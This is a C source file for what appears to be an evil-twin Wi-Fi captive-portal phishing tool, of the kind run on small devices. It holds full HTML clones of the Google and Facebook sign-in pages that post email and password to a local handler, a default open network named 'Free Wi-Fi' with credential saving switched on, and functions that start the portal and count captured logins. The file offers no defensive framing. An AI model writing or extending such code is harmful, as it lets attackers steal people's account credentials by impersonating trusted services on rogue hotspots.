#include "phishing.h"
#include <stdio.h>
#include <string.h>

static phishing_config_t phish_cfg;
static uint16_t creds_count = 0;
static bool running = false;

const char* google_html = "<!DOCTYPE html><html><head><title>Sign in - Google</title>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<style>body{font-family:'Google Sans',Arial;display:flex;justify-content:center;"
"align-items:center;min-height:100vh;background:#fff;margin:0}"
".card{padding:48px 40px;border:1px solid #dadce0;border-radius:8px;max-width:400px}"
"img{width:75px;margin-bottom:16px}h1{font-size:24px;font-weight:400;margin:0}"
"input{width:100%;padding:13px;margin:8px 0;border:1px solid #dadce0;border-radius:4px}"
"button{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;"
"float:right;margin-top:24px;cursor:pointer}</style></head><body><div class='card'>"
"<img src='https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png'>"
"<h1>Sign in</h1><p>Use your Google Account</p>"
"<form method='POST' action='/login'>"
"<input name='email' placeholder='Email or phone' autofocus>"
"<input name='passwd' type='password' placeholder='Enter your password'>"
"<button>Next</button></form></div></body></html>";

const char* facebook_html = "<!DOCTYPE html><html><head><title>Facebook - Log In</title>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<style>body{background:#f0f2f5;font-family:Helvetica,Arial;display:flex;"
"justify-content:center;align-items:center;min-height:100vh}"
".card{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);"
"width:396px}h2{color:#1877f2;font-size:24px;text-align:center}"
"input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px}"
"button{width:100%;background:#1877f2;color:#fff;font-size:20px;padding:10px;"
"border:none;border-radius:6px;margin:12px 0;cursor:pointer}"
"</style></head><body><div class='card'>"
"<h2>Facebook</h2><p style='text-align:center;color:#606770'>Log into your account</p>"
"<form method='POST' action='/login'>"
"<input name='email' placeholder='Email or phone'>"
"<input name='pass' type='password' placeholder='Password'>"
"<button>Log In</button></form></div></body></html>";

void phishing_init(void) {
    memset(&phish_cfg, 0, sizeof(phish_cfg));
    phish_cfg.template = PHISH_GOOGLE;
    strcpy(phish_cfg.ssid, "Free Wi-Fi");
    phish_cfg.channel = 1;
    phish_cfg.save_creds = true;
    phish_cfg.timeout_sec = 300;
    creds_count = 0;
}

void phishing_set_config(phishing_config_t* cfg) {
    if (cfg) memcpy(&phish_cfg, cfg, sizeof(phishing_config_t));
}

void phishing_start_portal(void) {
    running = true;
    printf("[PHISH] Portal started: SSID=%s, template=%d\n", phish_cfg.ssid, phish_cfg.template);
}

void phishing_stop_portal(void) {
    running = false;
    printf("[PHISH] Stopped. Creds captured: %u\n", creds_count);
}

uint16_t phishing_get_creds_count(void) { return creds_count; }

const char* phishing_get_template_html(phish_template_t t) {
    switch(t) {
        case PHISH_GOOGLE: return google_html;
        case PHISH_FACEBOOK: return facebook_html;
        case PHISH_INSTAGRAM: return google_html; // fallback
        case PHISH_APPLE: return google_html;
        default: return google_html;
    }
}
